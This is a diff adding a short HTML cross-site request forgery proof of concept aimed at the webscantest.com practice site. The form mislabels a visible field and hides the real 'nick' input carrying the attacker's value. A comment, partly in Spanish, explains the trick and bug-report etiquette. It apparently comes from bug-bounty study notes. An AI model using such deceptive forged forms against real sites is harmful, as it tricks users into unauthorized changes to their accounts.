@@ -1,0 +1,27 @@
+<html>
+    <form enctype="application/x-www-form-urlencoded" method="POST" action="http://webscantest.com/crosstraining/aboutyou.php">
+        <label>fname</label><input type="text" value="Edwin" name="fname">
+        <label>nick</label><input type="text" value="Private mejia" name="other-nick">
+        <label>lname</label><input type="text" value="mejia" name="lname">
+        <label>submit</label><input type="text" value="submit" name="submit">
+        <input type="submit" value="http://webscantest.com/crosstraining/aboutyou.php">
+        <input type="hidden" value="Major mejia" name="nick">
+    </form>
+</html>
+
+<!--In this last snippet, we've changed the name of the
+other-  nick input field with the nick label our hapless user
+is expecting, while making the real nick input hidden—which
+contains our secret value, the rank we think the major
+deserves.
+Of course, when you're creating a CSRF PoC as part of a bug-
+report submission, you want to make sure you're not actually
+changing or modifying sensitive information (such as a
+password or transaction amount), though it can be useful to
+make a small alteration in order to illustrate the possible
+impact of the bug.
+
+En este caso en intercept es donde modificamos los datos
+luego damos forward y vemos los resultados en la web page
+
+    -->
